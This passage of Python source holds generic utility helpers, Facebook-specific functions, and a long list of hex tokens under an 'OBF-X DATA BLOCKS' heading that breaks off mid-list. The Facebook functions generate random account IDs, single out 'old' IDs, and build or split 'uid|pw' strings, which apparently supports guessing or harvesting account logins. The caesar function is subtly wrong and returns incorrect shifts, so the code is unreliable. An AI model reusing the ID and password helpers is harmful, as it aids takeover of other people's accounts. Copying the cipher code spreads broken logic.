def pairs_dict(pairs: list) -> dict:
    return dict(pairs)

def get_or(d: dict, key, default=None):
    return d.get(key,default)

def is_empty_val(v) -> bool:
    return not bool(v)

def coerce_str_ext(v) -> str:
    return str(v) if v is not None else ""

def coerce_int_ext(v, default: int = 0) -> int:
    try: return int(v)
    except: return default

def coerce_float_ext(v, default: float = 0.0) -> float:
    try: return float(v)
    except: return default

def clamp_str_ext(s: str, max_len: int) -> str:
    return s[:max_len]

def repeat_str_ext(s: str, n: int) -> str:
    return s*n

def center_str_ext(s: str, width: int, fill: str = " ") -> str:
    return s.center(width,fill)

def take_ext(lst: list, n: int) -> list:
    return lst[:n]

def drop_ext(lst: list, n: int) -> list:
    return lst[n:]

def enum_ext(lst: list) -> list:
    return list(enumerate(lst))

def freq_ext(lst: list) -> dict:
    _d={}
    for _x in lst: _d[_x]=_d.get(_x,0)+1
    return _d

def most_common_ext(lst: list):
    _f=freq_ext(lst)
    return max(_f,key=_f.get) if _f else None

def group_by_ext(lst: list, key) -> dict:
    _d={}
    for _i in lst:
        _k=key(_i); _d.setdefault(_k,[]).append(_i)
    return _d

def safe_divide(a: float, b: float) -> float:
    return a/b if b!=0 else 0.0

def normalize_01(values: list) -> list:
    _mn=min(values);_mx=max(values);_r=_mx-_mn
    return [(v-_mn)/_r if _r else 0.0 for v in values]

def caesar(s: str, shift: int) -> str:
    _o=[]
    for _c in s:
        if _c.isalpha():
            _b=ord("A") if _c.isupper() else ord("a")
            _o.append(chr((_b+ord(_c)-_b+shift)%26+_b))
        else: _o.append(_c)
    return "".join(_o)

def rot13_ext(s: str) -> str:
    return caesar(s,13)

def reverse_str_ext(s: str) -> str:
    return s[::-1]

def is_palindrome_ext(s: str) -> bool:
    _c=re.sub(r"[^a-z0-9]","",s.lower())
    return _c==_c[::-1]

def build_uid_series(prefix: str, count: int = 10) -> list:
    return [f"{prefix}{random.randint(10**9,10**15-1)}" for _ in range(count)]

def is_old_uid(uid: str) -> bool:
    try: return int(uid)<100004000000000
    except: return False

def uid_to_profile(uid: str) -> str:
    return f"https://www.facebook.com/profile.php?id={uid}"

def uid_to_mobile(uid: str) -> str:
    return f"https://m.facebook.com/profile.php?id={uid}"

def extract_uid_from_url(url: str) -> str:
    _m=re.search(r"(?:profile\.php\?id=|/user/)(\d{5,20})",url)
    if _m: return _m.group(1)
    _m2=re.search(r"facebook\.com/(\d{5,20})",url)
    return _m2.group(1) if _m2 else ""

def retry_fn(fn, retries: int = 3, delay: float = 1.0):
    for _i in range(retries):
        try: return fn()
        except Exception as _e:
            if _i<retries-1:
                import time as _t; _t.sleep(delay)
            else: raise _e

def count_lines(filepath: str) -> int:
    try:
        with open(filepath,encoding="utf-8",errors="ignore") as _f:
            return sum(1 for _ in _f)
    except: return 0

def file_exists_ext(filepath: str) -> bool:
    return os.path.isfile(filepath)

def dir_exists_ext(dirpath: str) -> bool:
    return os.path.isdir(dirpath)

def make_dir_ext(dirpath: str) -> bool:
    try: os.makedirs(dirpath,exist_ok=True); return True
    except: return False

def delete_file_ext(filepath: str) -> bool:
    try: os.remove(filepath); return True
    except: return False

def append_unique_ext(filepath: str, line: str) -> bool:
    if not file_exists_ext(filepath):
        return write_line_ext(filepath,line)
    try:
        existing=open(filepath,encoding="utf-8").read()
        if line not in existing:
            return write_line_ext(filepath,line)
        return False
    except: return write_line_ext(filepath,line)

def progress_bar(cur: int, tot: int, width: int = 30) -> str:
    _fl=int(width*cur/tot) if tot>0 else 0
    return "█"*_fl+"░"*(width-_fl)

def human_number(n: int) -> str:
    if n<1000: return str(n)
    if n<1000000: return f"{n/1000:.1f}K"
    if n<1000000000: return f"{n/1000000:.1f}M"
    return f"{n/1000000000:.1f}B"

def list_stats(values: list) -> dict:
    if not values: return {}
    _s=sorted(values); _n=len(_s)
    return {"min":_s[0],"max":_s[-1],"sum":sum(_s),"mean":sum(_s)/_n,"median":_s[_n//2]}

def clamp_list(lst: list, mn, mx) -> list:
    return [max(mn,min(mx,v)) for v in lst]

def running_sum(values: list) -> list:
    _out=[]; _s=0
    for _v in values: _s+=_v; _out.append(_s)
    return _out

def zip_dict(keys: list, values: list) -> dict:
    return dict(zip(keys,values))

def is_json_ext(s: str) -> bool:
    try:
        import json as _j; _j.loads(s); return True
    except: return False

def url_encode_ext(s: str) -> str:
    import urllib.parse as _u; return _u.quote(s)

def url_decode_ext(s: str) -> str:
    import urllib.parse as _u; return _u.unquote(s)

def base64_encode_ext(s: str) -> str:
    import base64 as _b; return _b.b64encode(s.encode()).decode()

def base64_decode_ext(s: str) -> str:
    import base64 as _b; return _b.b64decode(s).decode(errors="replace")

def split_uid_pw(s: str) -> tuple:
    _p=s.split("|",1); return (_p[0],_p[1]) if len(_p)==2 else (_p[0],"")

def build_uid_pw(uid: str, pw: str) -> str:
    return f"{uid}|{pw}"

def first_line_ext(s: str) -> str:
    for _l in s.split("\n"):
        if _l.strip(): return _l.strip()
    return ""

def last_line_ext(s: str) -> str:
    for _l in reversed(s.split("\n")):
        if _l.strip(): return _l.strip()
    return ""

def build_separator(width: int = 60, char: str = "─") -> str:
    return char*width

def print_separator_ext(width: int = 60) -> None:
    print(f"{GOLD}  {'─'*width}{RESET}")

def eta_str(cur: int, tot: int, elapsed: float) -> str:
    if cur==0: return "N/A"
    _rate=cur/elapsed if elapsed>0 else 1
    _remain=(tot-cur)/_rate
    return format_hms(int(_remain))


# ============================================================
#  OBF-X DATA BLOCKS
# ============================================================

_TOKEN_POOL = [
    "6a208075a3923575debc3bff61a4c6ea2c851f20fcd71b97f0ddd676bef3c3d1",
    "d14dc378a3b659eae76639bf728046b1e3abbf102e70bbd2031abefdb2493a15",
    "806d0d4e535c88d8f4df82e47319fe30b5c5f93a1e881c18a356bb075f37e344",
    "d357e8fd19b932eb728987d2171b331e3fae1f6bfc7837bfe37f41ab55b6b745",
    "4e8145cdddc0fbb898db0f17edf6dd6389a5bb2047cadbea01ec19829104c665",
    "004a19e4aae14209a49e75957596447786ac6b710fcc564f4369de4aa1cb920f",
    "8cdcba64bfc0ea29bb6e5e717c209813e922cd9fdccd81853f96aa547590bb0b",
    "5e1a239b453c06367753411cf453b9c4b88362bb1d422fcaa62322af801375ea",
    "69751be2e04c4a786f9c604aa8e645e94783e3bf30189acce5c328a8192da309",
    "02ad194cf30836da2240583133d1b9638b2a1b13daddf4e3ea691e51dba1b359",
    "6b137decd594274d87071472a4c33f4831aa7f1007788215a4b10ebcfb7dc225",
    "e36f8fe55c1829e597735a6434bdac73c17c78772adc8963b3fa55a27ea00e51",
    "6bf52506c4c908cd55477b524be8ac7ba859893aa6c712cb4075fca44fc0a9cb",
    "14e16f9147fa6e1c1684b5a972df1dc34877c26e21dccae7bfcac210d67021b6",
    "caa4585276032d4606ebff8a19a50bd83550746c14c1df6625177bae4002d07e",
    "606f173ad41bcc16743506077bb265d8f8b57a1794b68fec47e02d2db9df255b",
    "1aeeb4850ff3892da56276fd5508a5483336cbe561cddd7c0d04c7c502ec7f07",
    "e0e2c753a5e3d1ac6e91503276b411b57bd8597ef77881b0ab0eea6756ed122a",
    "ac99902cea3854e9c8f848ff4f4682b25290a50b27bd6f5f5b6fd383ee2bc8af",
    "2f778503068070a5a5ba7708b0c7441679b7980ce247d1d9b2f1d6e45bc510ce",
    "0c3fa6a2ab6d1d894f035f79776b78d9014f6bd4b0f1d71753d0ae29a7e9219e",
    "a885ffb9bbb8e424e58a9b1cbe208c05df99cc04069c3ddeaa3a6bca7a546624",
    "46353d33579df6b68836e84cc9b2ed50efb0d6e7aee5bcd46598876e676d68f1",
    "3af82217b370b3a947caa9e130fb8df811a805ebf7a741fb5ebe6aa6724e2e5b",
    "309a2185e210ff5f2a80b2adb69f2c7fb4ec8dd6b37639dbc3e39adca8695552",
    "24a7ee17381ac1111c11d127c30ff867e21351ad9cfd4268ea076b5afd8d1a0b",
    "98c08f233e046caa0d25f089e5e0ccc1e801d9b7242a465a99a2ddfe8e42b9ca",
    "37f70d10e0877f3ce6c20625d48fdab5ff4b14140e487f4e0a459c9340259d8b",
    "97dfa51d5b75031889ece3c9f362b0c33924f7c6c81e1517235cb0bb9fcf2cd9",
    "619e5746943f141f849563e41f4a3f8a1cb1e8af161efd4983b6ffb51f6acf76",
    "1be31154121f5e557733d8cea3228e8704d02a3c1e1e2dca37cfefcb9d8915c2",
    "05b7fa13bc6db22697704fc3bc63b549fd9f3b28ce45b7b5ddd1061f1d94bcd1",
    "c9620d66b7070f91a9a15249271c441b205e18872b6cdd073c1c53a0f4521f7e",
    "60948de6e8c1dcf67b25a4b147ece7d5fa9e951a9c1ad8e552331b7bd84cba60",
    "02ff84c5d60938745f318bbbd87370c72eed1aa1c0a793d8824bbb0de0cc06a3",
    "53b982a202e2f43f2a4007a123def041f57022571c8d01a18ec9c799b5ead68f",
    "2d15fad908dd6ee157bf008efcd4076059d662568ddb543b5f7715e674c5a4c4",
    "14b449fbc833c308f59df2b3b3f8cba8c78a1138d808f5ed3e27946407804a62",
    "471eba59a30a28ba2cc12b3d44d44fa153b5e13bb2edf1044309f6b86b5ef8d7",
    "a37e3069851961202adbd410bca0a82da683f2b9c57da1648f9513dbb8677862",
    "1538932d3bccf417d29a6555d34346ad67f6e773c56b0b55ebe537a816a10f6b",
    "a05654e0d47dc3730d37e2022826d76b849e593083c3d3b7a3d4e44099bf7348",
    "4375df4d4146c18feda1af2b1d4dea2aa8a4838b932ce6b32bc2328346af7b6e",
    "b86ced0038a0f837ef98d3f76be5a9de780249a3ce6e23bd491fbbbd7fd9499f",
    "6ec2e03ddd70160dc3e2f4b267b9c995684a29377659b1c8939f162455888d71",
    "9180ff145e95fefa6034b997f0b60ba9228eae092b2e56383170a4f4ef250aca",
    "8c29e19f1e30e136f77f28fe68f80d7b7fc398c49423dad5328770bca7640a47",
    "c64dc0ab7b22918277a76d6bb94c519950fd32d0ad5d406c3c4e8afe6bf3da82",
    "9a372d9de6eb5f613c72d3a4ba6b2b3947e6f6b781cc847bbb78601e3c22db0f",
    "3645169bec9d160355ad6ce81e89a74e4b42ce7fab6f4c18707469db5098e183",
    "e3104a72b163adc2393003fa58c3b0f692bfded8e8d7f46e05e00717a3b5d9c2",
    "79248bf3694240c7ae54cd4efb8571293cbb37d5b460e7777bad2a581f97e41e",
    "9b4350efcdf98de2090eb9e3bcc91ea73641c91a922737a2349dcc329462042d",
    "9e67969a7a83467b18005831b6c015e3e0197c1a638acb04631e1dd21930adca",
    "ad94e144b9adafb1f57b055187b1e1e02e678a379160b6d4de4408a5c2eb5281",
    "69d94ab8d52cd7b00646107a9f63e9f11f6795b9d06ff6ec6f42f79f70e709ee",
    "be4dbd54a0491b3460ce191d5f76ef175cded780edb84d8fd4c8fb85561af73b",
    "d2a9c2f6d2424ea00cd3eecdc0079daa09a384423ddeaef0ca2d48f058714fcf",
    "e3f412501149fbef4bbc5b4298a0c5bceddc02fb271a98c93c98c63dfa1f1c5f",
    "0a320b2fdd87e78028120301781ad4e1a2ca87b207936c0ed115fcfcf4f10e8f",
    "45d02d2371e2b3dd0e1e54a0c4c3eadfa4d4df657becc64ca185f392417bc31c",
    "63bc6b9edec7b41da06ce175e2ff0b26a91824d203ee7cb0a4985b6b306ff8ea",
    "fac1fbea84e88715f0e763b6e872693d0c3a1bad0c386a433778e85507283b7a",
    "c3e89819abe26211fbc6469af5c7780a610c6e3a7e90693b66b985f7f38ce38f",
    "e44a6797bf7df6b8982cb62fb1c6d096f4186b9ca879ef00b0923de51033a990",
    "b28a6ca2196dd0799a1c5e7ba10df6e3e63a93e0b31a3ecf9d6685ecbac74328",
    "8f4f229d8eef875c62848ace4e1c5dadb00b708bc71b85e18b3667e971019144",
    "b56f29f4699f78ec09e24d3e3662895ac1d58a3b393cfcaf3110def9facad8ac",
    "c8594fa6ed25a9b87e52e7be9cf3b035a056b3effd9123dce6e1a20ed2c347d3",
    "cd6b0b9cd213d696c2910566a3ac6a397544cc6b704ea602ac4b9fbe04d37c9f",
    "aa9ff1b05e82a03844de16caa2cce2f7d7c16b0314067315bd012e61854fa2da",
    "7373c32026d15b4c7b3a4d70ccaed4e1fef64f2d1b8d48a6964fd968bd9906e4",
    "1ab60022122f84938ce71d30b732969d8b0cca2b04be78fa43b97ae796beb9af",
    "a650a8d4788fb11d890704e34c837c94730ad0e866a5cc0298ee8fcc8915377f",
    "c6506ba24b6fdb2d8cdd1de30621c21e03111e2f1f4f80ea0703cfcf663cf02f",
    "05d7f037683051110559ecd8bcfb74d24811dfa88b11f7c6e9dfa5f5c3e270fb",
    "c16ce5b347a74461e96943834be4ed43e4752e75fa4aa323a3767beea6c899a7",
    "2e7e429e952ef89f8bddbd3be2e312b880ab9827690f80ed896767f8f03f21e4",
    "9050d775a77a79006142c0a82859abdfa0508fc4c792f74fba0b9870b7278af3",
    "318bae7ac133141b0bcb8a0f8c5b7e0162787fd572acbc90acf7e60ea91427c2",
    "1b037d7d984a5628be1e374a2c477be2cc86325bb871c0568ebb69edf095c0dd",
    "ab5cd7b9ba0dde7998ed0efdafaec350427972b3459a35608a9f1ea8e9a96067",
    "d2f6d3471b89c96e7316e1854897d8f791e241ff33e76ce6d937fb04da0571d1",
    "6550f62ca11eab28a13512fb3312ff72a5f12320c79ea96bbfc55257e725b7f6",
    "857cd730797b841a8fde6a3b2b120df0c5ef699bd07259a606688769ec71369b",
    "aee1ba607ae93e35741abf6966099d4ac217dccabea1788190914d6f6b4e3ed7",
    "f83eed5dcfff5a55920250c41acdde492e6188ffc989f5cf0462023e2eee9fd3",
    "b7832afe59ce4f772e9f6b8644055dfdeac0ce4983fdf80a71d0c37e36988542",
    "4f990d3aa30a3f5b73047d6dd3acdf251b91d7a4f3bf591f63d292b1f3e504bd",
    "322b3242aa75690837cd1d19d361a29cfd7f3a21f489579cac601649973b8df9",
    "430eb6b36c239253045ebe8df572d82eea513c823d666240ddfc1db28cbdbf7e",
    "d24d510b96559087bb0c37dbad23bf41cadd758e1f377c95dafaabb8f3b1c6cd",
    "a645253e3e02adb15cdbd0eb50704dff161fab665f537d15e21ff9dd63c41934",
    "7f3f715c1672ec252c6a9946b1c1c43933271ea4665e67415ddcefc1f5bcda80",
    "730972f198d090b833dfc1f0670592e4be254a948abbce639449981c24ee38c5",
    "0dceeaa81432ecdf7c141694110a92b3d629ae1a1af6af2f621debdcf2373276",
    "e9f55c554dae5dd7313d814255d5c805fe4bb0fb616ae78333bcc7dca65c096a",
    "ab793684db1e0378c0d7f642682d4147faad1b61d3834af8d928523eb089f998",
    "d3601f1598a3bfea08ff86a5dd8df25311cebaae48d8a44530e95744813bb8cb",
    "48898821953870de0056327c6d10ef4878376bf5075832605ac6547995f2ccc3",
    "a17787d4b761bfd8e981fb737f5cd0ac04c5203709e866b1bad79791678f7cd0",
    "d259475ed92167860eeae0db471a10c509b8e517d654f9bda8b2c5b2ac82ab3a",
    "ce8e742217b0dc9093d5d91beed3a88bdddee36d5d3bce1f137e897ab369e47e",
    "2ccad2d0ab0c9751c250faa0c74853999d7b2869e070a9856666cb7cdc731fd6",
    "49f851b4305db666e0c7ce0d0cac67d708d407474f58752ff41210c529634bf4",
    "e377d76205ebe9b19a1e2a1c2a977d3812970c2ea701dbfab890f591e3613cd9",
    "81c396f25c93c34b7e520d14ccb580d088e5fed0cb79275abd4c0f846cc552da",
    "507ce281dc62372ecba89837e1cd86f0b3fe986318d30fda15f98bcf9650bbf5",
    "6c87f8d69370dab1c4ba103326093b87a0d2e91192cd67e72dd147af89149b32",
    "12f891bfdb39b5d65f519852a3d83fd4f46983b9671ec5c902cee361c5f0241e",
    "6fcee618938cbfec83d29fb1b2526f87249ead6ced00c8c60200f26edcc91f96",
    "4e8468c8c493f194c96b2e6c64036dfa974f9bf36f411016c1ae2034fa8a87b8",
    "9cee0eb7e0285bb010ffa79ae034753b4e5d8fc7c18ae33ce4158cc6fd1f38c7",
    "dcbeeecc148f38356e9a477653884fe0e33f2e4d99ba278ef65f756cad29c697",
    "b5daf7c46032deee8a39c968ba8023497adbd0fca08f38971e66248e0b74877b",
    "659264a76663d563d9593e303378f3c4434a17ae51f1f0cbc52a94a7feb6c460",
    "d30d5641cbf538984b73a822f66c654c80bb013626e23a6152fce0788321fb09",
    "4fbc8070b6846c267a28c5b30485567c9875e2d81a2da5d70fefdaa5367e6d05",
    "18f1f0f84bdd636a786677ea5caf554ba6dc224b65492f89cf7a67cdfac24e19",
    "a9027324c88d1e2649ff329a819d95fbc3eabc70c97d01fb23d83b02d2684f77",
    "e1fc02de2ab86f7eae767c98542288d7cf1e428cf5996dcd5cfc60cf7a70ff3f",
    "43dd2c42032bac1d1a609b0b6d0f9d0155f7ff784c2f037f20d61b6965e106a9",
    "742ebca2cbdf04363a6b7cb0f8e0b8a0ca50650c966a8c742231e488ce36247f",
    "d7df3a3b5e403243dfe11ee09da876a482e75db544988a1f56bb0eb2fd3474e9",
    "666f6bb2dad58c31335658d7d571f79e34fc13deb75d67a82f1294082402edc0",
    "8f68b92a32705c2ee3dc6bbc99acc65b27d017f638e724c17d071aa2dda11699",
    "be352d42ac137dd137a0875d1b6ef1f534bcb243533df3b0991baeaf3f2777b7",
    "65e8907427f3e50dd7f8e044174e6bd970294fd1b6563e6778ac01e16e79d437",
    "4da2660b987257698ad13b8dd2f6afca12ddbdb71bfd6b40a7c1f6fadf61b48c",
    "77bb45c63d797935a08338f7edd7e8be8a3369f05f987e526ad1b027eebc4dfa",
    "23637ba27238f1efe5dc7166e66a09ef80cc438babfb055983ec1387331536d4",
    "07e28bde59ca07d461de3f903b62be7907aca7e7eb5c0a44b9ad4644ecf42f17",
    "4d4841949de74208a064520fc8e8a1384cd81e84c321ee786ffa943c2feb7a8e",
    "a4e54ec556698bd543fcaee3549fab4efbe0daea4bfc205fd11100feb4993383",
    "bacf19d683e8f8b12bd4e9a681524c9cad5dbf08c1e0ce4ca1a8cd813cfa8bfd",
    "0316ffb041c7961e8cfa175adcac713103a7d86451b319a379df72ac16174158",
    "c9f7bc95ba6101b4c781d157c2dd8ec35705378571d065e7e3c4b43926108058",
    "a7d6aecfa50d838b9b3075b7a157438fcbc424e2b28a6abe1929fecd4d7b7ac4",
    "0904385a90fe47815b795a5812675956c85e9f417eeb97741016bb219670f0fb",
    "6a454624724a3580964be331af6977764a326f8d08d878d8800c838bfa1b9343",
    "e37b4dd6666aaa08d36a5516c4abde5ea50f8e2fe820a5d68d57b86aa89e0750",
    "a03d3d973d91a460161a08325203df72513baaad6b61fbbbf59d6d6b411d51c6",
    "4c2b3c92e17dba73f0000552b1d70a02aa1050130c46e15a6771a1afd269c76b",
    "bbfa62dfb26c35d09a0f92ecfda84b329a59482ecfb1583ec7ee7e9c52bedd01",
    "462c1b9a3afe8347a1a4e0b6d0c0af8d81bb61b36040507b47c8b6849c4477cd",
    "54984b83e29ac22597140a0c913005a51158bbcdf6509f2c80a25440ed5e05cf",
    "54904c6495951742bf28af39672e32009d67bea0fe3653cc823e65719c366d0d",
    "0ded6a3fbe7019f84d96bc40872addd2bfcc8fdd7dfb8880a3085e32280dc902",
    "9a66485a74b675fe412ad54e2e623917b27ed3abfdd832d8087ab33448133d7c",
    "100f991544e03779e6eab0f8238044eb29db681957b6ad2fb88fb9ea2c86fa82",
    "9e12299fd8eaf6f22f22ecba4a4d26955e8f3ff444039507cdb7f0f0849c5edc",
    "1bd16560fd2fe136cab5edee8927682ed62cbd3bc28d48a49f06b9850e6498b0",
    "56ce04ce8596e2a90d6bf3dd8e91bc51396b4b084d7a8cec6bd9d89e6c0a0a11",
    "3fba78950cadd069f7a6ab5c230117d4e69621a32bba3bac3f987ee5233bf3d7",
    "1443b2509cd9f65e3695602fc117913c64ef8766b63fb72f113e9c2fcffbfd9f",
    "cf6b65fab9715abcd0a022a7a08c7ee72f4c4d396c2422c56802943e30348ef5",
    "04c3ba647e937bc2779fbb63386bcb45bd55408bdc87315c870dc03d3f08dcc1",
    "fcae265842728a4af04ac0c6b5f8d97c508f39d51b598156a3834443830afaee",
    "56c5465d07fdf52d06a54664e6f0577b2db2563a64302b65ba24c53c9abbb9bc",
    "e031c65dc5569ca05eb6be865d966bbaefb03db274f70264789e2b2878d85f41",
    "3d169189c6f6bece214a75dc5f4161eee251fb902ec61119f70d6ef4cfbfe714",
    "a3e4f108f51e7c409f1d248e2f70bd497c67b457f1e5e6bdaea741ea4014af0e",
    "41166dc837041047e2ded94917241945775262c203d203c07210e6269cb6487e",
    "8792c8e71b1f97e61325bd82dad3d26af8f3cdde668e95158dfbc52d05d5c87d",
    "0efa07d7ca704794cc41258f3498c0bc526292c144021644241a7f85f3d664e5",
    "b2ca87c53ce00e6a3502a106a004a8b0fca634a079f51ae09d95b104acc4f39b",
    "11388223427e4c8d150ef86365442bc0e01c6549ab0135d86d3a0d5deba5afb9",
    "d9d6703806d5f9daad89d1136b9abdd912c07abeef429583e923e81c4cfb0d65",
    "ae473267c5e1245c912145fb9a1fefa43c01eab381d29e5e52df263d7bc1d01d",
    "a69284b38818926df50b16acc4d896868d992f5bb452ff590ad9b3315197d611",
    "55b418b05caa63a22d35f0ebd02dff2a99c76d3155cb831d64b11358a679d6c4",
    "1bde3c37e741ded14aa6cda7e5838ddab11876ab6f2404526d6d1a502b5a2ff7",
    "2abdeaf7433a37a85585f4250d9a12a8b94f034daca7a644828884ddf2ffc8af",
    "00feb58078201dac1defa985af45a48f62ba46e5e15ba817c9f31a5dac4da098",
    "0f0cae77db0207a2734fd6e266a64c361cb913810ac980ea1a746bb9b52ed1d4",
    "f476d808b3c35a0eb46211af40253c5656a480558488ecfd9566343722914978",
    "af7f2654866a24b0f70fb115b84e6ab3ae87abd39e5eed469ab5044376487a48",
    "8c8aa7c23fcf2e6b6359d3048d3a850b6ae5a836108a39c790db247454d53738",
    "f643e24f0a3baa5058f2599c03d0573e2e8cd16b22cce772f1e64b31e0dec347",
    "c5e0f814d7c11addf93a16624555e3542d076f6003b985885ce69efc5372f73d",
    "785a2243839792d7d5fea2328c653abe77e6b2d48adee23c58ff611292fe93fc",
    "9640cb80be59ccf61286ed6a92863c51513d6db9bffbadc98c5dffb1803dcde7",
    "c952055fb21d5fdad4feea3a5bcd57604275e34185e9c375830a35b07a31cf9f",
    "80ceac8686db39fa4a9f2c8fb42d084b88ce9c362885cc0dd0db05c38f09b64a",
    "1b91dcc99ae57a9925d9e9662538f5fa78beac1e12205612e32d36c96c699b63",
    "42411efab3714aef4bb70cae2f74d3967fce75e76fd43c25c78be9b1d6d50e20",
    "b7f9f269198a4dce3746ab240ee1a8bd741725f1e575b18667bf86775dc68f4a",
    "8cfa06a684786c7d15bacb6372c03bb1bf6da8faf469a25c473071b1da99dfa2",
    "7bf9ed866122bd2e0850d301e3d41bd57de5b140d8ab193654deeae01107d230",
    "49ffa73e87299d52e049fff4d7d48be1aeef41913d7edacecd240d913590e87e",
    "3aff77ed34d80ca3424324a42a0a0c2efc5129362bb0de26a4def3026247d5b1",
    "cb7273ff96f430eb57ccb884bcb53fa458077e1396900f44f96d16bff326ff33",
    "2b38b01ad264c81d613003d46e6050a26176ccf1f9ccb9ced100d33ed7cf08e5",
    "4a1a473262e9486c8ce54994655c2309cc2917d5a327462f75b5e0d2d9a7c6eb",
    "f5c0bf1db0a9aaaa7e9ef8d763c05c844f68e3ad86198da8feaac4ef56280f70",
    "be267995a2bd08133d8c04a3bfcc7347b36002d211a1bfb7d9e44ce3906d6e1e",
    "68a670c5d5004e80d7743b2058ebb3b369f8b8bba74602f766b0201af12b5275",
    "9d3afb804107f55a282778cd8d3ee0f3bceae40dd71f47a5472622e2e3229e4e",
    "470e76168430e19be139d3815598a450eca9c9b7da5e3db372d76b7dc4ab8924",
    "bf82614cfe1c794ad5cc1c2bb761e4a69decf86b3bf92598fc25a56754d90e60",
    "ad381cb57ea4a2e91fb4525019555a0f483ec09145b9dda644f4941ceff45135",
    "5446a2eaad865068e083e41891e57bcfbe8b1274d94d2d87788f371a5a61405e",
    "db8bb6be505f49d44fa6fcc7622b5767c2c42743268a02dfbedd45e3dcfc448b",
    "378c90ed99496f35a662be66f42b8d5c9435030e07ca96352ffa8238d81de808",
    "9017bd794e8d9c6fa1feff2ef8d0eff360a5a0b49f293fcd7487126b3d1d1b99",
    "b93dd22387097becd8b3025471c6864394701becd5a370c8f922b369f782f78e",
    "d574140cac56a6bdcf14fb4be928cc0f7bb75c22aa0c59e87f7e62cabd531bfb",
    "6a9aa35b62221da2467c6516f9dda8adb9a980bb8bc4f675bce5b1730d9e59be",
    "7a907a71a5a5b8aac0ca433920d1ac7baa16378a4544108c16db8873d2f0f485",
    "1d145015bc354b7459fb31a2c7531b89a2553041140f823d3ebcb2e869cc3dda",
    "e6f3c241f4e079bb453b34562d0a49a33a9739bfe6ae8d27ba2f2add40664728",
    "6991891d054ec3d79306ddd5f3df2353394a98f4f42ddb1d0f9e67b85c74083e",
    "a0a6f8b6cb03b446f00d78cbde571c764b254dfde56d9c3af63a31a91d13d69f",
    "9f36653c78c9c96820f39d1565a8c146989111c71effdcc3b73f0ad4df755743",
    "43308b2633f499b3b4a9b858bb958f196e76d74a433a0ca581c8f2b735b10708",
    "0e713d6220d62c553e2968d2a2ea9c85744d29a832855d0183baabe662dd548c",
    "fce198f96d6f69d86108b11f91417061263cba7c93edbf5960b6b7f6934326b3",
    "7ea107250c3478e0041533107501a7eaba98f4bab697495fcad27f1c6489fa97",
    "453ded2f17c0af2821aebf0314caa37684ac5db691a154943c9af206a5adbaed",
    "fd2f51f78f330355c01a2c48eb7e8db74938aa1d14dc8db4d0b05ff7f4f09353",
    "bec0965f7ea58fd720d9da5c3ed377bf0b9bf92836753af2ba2d79d878e9f050",
    "4017001e87b9b7b26b4da03d328479bdd42fe11d81f251757d499270cf476c8d",
    "b60e6fc05a3e10ec6c15706505f6681e4a50cf89255b174016de05e99e5b8b57",
    "1800532b5e4058629ce2a3ecf08e7650a859f93bd1e3df455fb7a89c397bfbc6",
    "08d015d57b772517e2d8bbac2f0fc2a39a18da7061f293cba6332f8e7f7ec73f",
    "826ffb2da55836ba3f5a93effe606e1ab57bbffb31289c9b5e6aca96bcb2a5d4",
    "8cf3ad266659795f71db4680cea0832d8df1b21662f4f1008f8c4229c04a7efe",
    "2b1b9884df52c142b68361e91a2a333b1615ab3592074b14cb616d7fe7671a00",
    "040e054d6da6d547026517deb10f48cdcae5334a8846fd63d3d77894ccc6c05e",
    "b47e337260936d0e3504964debefe98b635fe327f81db0f178cb999eefe6dcd4",
    "be34e26e03a3de0ca2b958e99b0b326b00b73dbce5272f7d3a79c7961c8b3308",
    "3a7b6039c030d35bc4482b9a6c6e43d4f40b43e214050615623dc08acd504903",
    "110af176c3c95e9b18f34bcb8b56f0cc7a220fd46cf6787c1d97a3a6877e2ee2",
    "83e10c19643d95fb48e5ee8cba59c89b0b29a4067c92a82c450f33a8572eb736",
    "b97741b9b1db89c83788b22e89e789c8de0f81c394486430a425b9a5c4fe9367",
    "04375ba742a0a5f9db4d922827dcd1c385e450cd33611805da0b0fed53c56c9c",
    "43ce85c0e3e844e7782bf4e89271a27e4b7bcf38332e6d0c88b368f58589f6a6",
    "9a7cb1a7bb7c6339c9cf67bbc18df5515b95a5d68d265798f5571a8d0199da9e",
    "25c4d4dea8c4bad423bbb05b832fc7a65f3229ea6ef49ad9abae93fba47f8a29",
    "24d087475571ce5891ae61c77591c7c3e7ecd2bbcc16a446ab124d204a566e49",
    "bf8b784a4f5cf4fe5fd11705968005e876c4bc26a5b6880f831c1e21bea9675d",
    "77a0b9ebd8ed86316a50f0458a4c1b4732d8ef54dbfbe99ae29f9039ee3273a1",
    "85c7a07197ff0a61dd17a83d2066e92a17740a78ecbf6eead67993db0b194c02",
    "82f59f027a37137dc951b07664f1482bf086e2f05d341be80f1fa34e1f00b082",
    "67ca236a868251c6663509ea46cc927331e7d3c771ed4b8d902135700445fc0e",
    "1e7a896515476d404622b16a0859cfc1558351b5f2e66a328ebe3c5bb644cc10",
    "e041814e2ec2c4595c26edf76a02acb4c7992440f63508797eaf2b6d85ad69da",
    "fb1d92a146317ebade1591550e8c1a97df670e913b4fcc79e23a0e48345e642b",
    "76ca0dfbecc51a276bd3fdfeb438889496350af7b8d68afd7e66784dcb98c77e",
    "fb22bb218eba7c52c54003baa4c025da511755def518a160e91450b8d3361988",
    "04c79ce5a55bf328ed287dbc35c6b7e79fbc4a412f7c47948178dafd6873f7c0",
    "83f1b5c432861daaff9bfd8758d5fd78b2f12cd7657968560d053fbb01b2b9c0",
    "255818c7a3584636581b28550cf767b4de6b85eb327cf2c0648870388c02732b",
    "7d87fa755e505b511675e612f31955969db19dd7dab8e549163fe5b51a5bfb62",
    "4ff386d3de3f918d75d6eb43679ab9a4ca831d6444bcb680c988c15fd4d7a443",
    "4e18272df52570ed8d3abe1825452c3f9f8fe39777f84ab59b7023e06b0c4075",
    "42996992ae953d117f99677b4b60057a95a0b7231a58109c976ee2190c52300e",
    "0f7ea22f3057a84331b0b1e567a69ea6a6f3c219b5132824a1a7d47b3feba615",
    "1da333eb1faede41e314e2566ea8b0448de9b6b893532222ac23624cffab7b82",
    "9a4739bc9623989c54a041a7cdb98c78a15b254455d8216db6708efadd55c343",
    "d8ebe193e39e47e441d090b8185c11087544c91586c615b4b2c91b05391cc264",
    "c02b88625b28ab65e47e73c7178eec230a9a444c38b0d7b99c0bd001c2493af9",
    "8d20a9b31b1fdb000a9a8d8763e2cc3049c21bc19ce135246d8855293a84cdce",
    "d7f9911cff20d18b37fcdabf7a9be65f953eec67417840a84987cd7a74d5fc19",
    "f53480edb16a26e24c9b68b54a79d9e74a62ac34a4cc755ffc48635e407186a8",
    "a561e6524972dd6334c876526dd53261bdf3868be367a39b6615ec55e8e0fb34",
